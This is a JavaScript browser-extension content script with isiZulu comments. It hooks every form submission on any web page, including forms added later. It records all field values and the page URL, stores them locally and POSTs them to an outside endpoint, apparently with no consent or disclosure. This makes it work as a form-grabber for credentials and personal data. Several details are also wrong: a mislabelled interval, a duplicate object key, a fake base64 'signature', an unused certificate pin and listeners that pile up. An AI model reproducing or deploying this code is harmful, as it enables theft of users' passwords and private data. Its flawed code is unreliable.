```javascript
/**
 * Content Script - Sebenza ephejini
 * Inthwala ifomu futhi ithumele endaweni engaphandle
 */

class FormInterceptor {
  constructor() {
    this.forms = [];
    this.config = {
      endpoint: 'https://api.example.com/forms',
      syncInterval: 30000, // 30 amaminithi
      certificatePin: 'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      enabled: true
    };
    this.init();
  }

  /**
   * Qala umsebenzi
   */
  async init() {
    await this.loadConfig();
    this.setupFormListeners();
    this.setupMessageListener();
  }

  /**
   * Layisha isiqukululizo
   */
  async loadConfig() {
    try {
      const stored = await chrome.storage.sync.get('formConfig');
      if (stored.formConfig) {
        this.config = { ...this.config, ...stored.formConfig };
        console.log('📋 Isiqukululizo lokulandwa:', this.config);
      }
    } catch (error) {
      console.error('Iphutha lokuyalayisha isiqukululizo:', error);
    }
  }

  /**
   * Setha amathunzi e-form
   */
  setupFormListeners() {
    // Landela lawo wonke ifomu
    document.addEventListener('submit', (event) => {
      if (this.config.enabled) {
        this.interceptForm(event);
      }
    }, true);

    // Noma ifomu eyenziwe ngemuva kwalokho
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.tagName === 'FORM' || 
              (node.nodeType === 1 && node.querySelectorAll('form').length)) {
            this.setupFormListeners();
          }
        });
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }

  /**
   * Thatha ifomu elithumwe
   */
  interceptForm(event) {
    const formData = new FormData(event.target);
    const formObject = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      url: window.location.href,
      fields: {}
    };

    // Gxila emkhakheni wefomu
    for (let [key, value] of formData.entries()) {
      // Zihambela amafayela
      if (value instanceof File) {
        formObject.fields[key] = {
          type: 'file',
          name: value.name,
          size: value.size,
          type: value.type
        };
      } else {
        formObject.fields[key] = value;
      }
    }

    // Gcina endlini yakho
    this.saveFormLocally(formObject);

    // Thumela kuwebsayithi
    this.sendToEndpoint(formObject);

    console.log('📦 Ifomu licululiwe:', formObject);
  }

  /**
   * Gcina ifomu endlini yakho
   */
  async saveFormLocally(formObject) {
    try {
      const stored = await chrome.storage.local.get('capturedForms');
      const forms = stored.capturedForms || [];
      forms.push(formObject);

      await chrome.storage.local.set({
        capturedForms: forms
      });

      console.log('✅ Ifomu licululiwe endlini yakho');
    } catch (error) {
      console.error('Iphutha lokugcina endlini yakho:', error);
    }
  }

  /**
   * Thumela ku-REST endpoint
   */
  async sendToEndpoint(formObject) {
    try {
      const response = await fetch(this.config.endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Form-Signature': this.generateSignature(formObject)
        },
        body: JSON.stringify(formObject)
      });

      if (response.ok) {
        console.log('🚀 Ifomu lithunyelwe ngenhlanhla');
        this.removeFormFromLocal(formObject.id);
      } else {
        console.warn('⚠️ Amakhosha aphutha:', response.status);
      }
    } catch (error) {
      console.error('Iphutha lokuthumela:', error);
      // Igcinwe endlini yakho, izazama kamuva
    }
  }

  /**
   * Ala ifomu elithunyelwe
   */
  async removeFormFromLocal(formId) {
    try {
      const stored = await chrome.storage.local.get('capturedForms');
      const forms = stored.capturedForms || [];
      const filtered = forms.filter(f => f.id !== formId);

      await chrome.storage.local.set({
        capturedForms: filtered
      });
    } catch (error) {
      console.error('Iphutha lokususwa:', error);
    }
  }

  /**
   * Yakha i-ID eyahlukile
   */
  generateId() {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  /**
   * Yakha isiginesha
   */
  generateSignature(data) {
    return btoa(JSON.stringify(data));
  }

  /**
   * Hlela umlayezo
   */
  setupMessageListener() {
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
      if (request.action === 'getConfig') {
        sendResponse({ config: this.config });
      } else if (request.action === 'updateConfig') {
        this.config = { ...this.config, ...request.data };
        chrome.storage.sync.set({ formConfig: this.config });
        sendResponse({ success: true });
      } else if (request.action === 'getCapturedForms') {
        chrome.storage.local.get('capturedForms', (result) => {
          sendResponse({ forms: result.capturedForms || [] });
        });
        return true;
      }
    });
  }
}

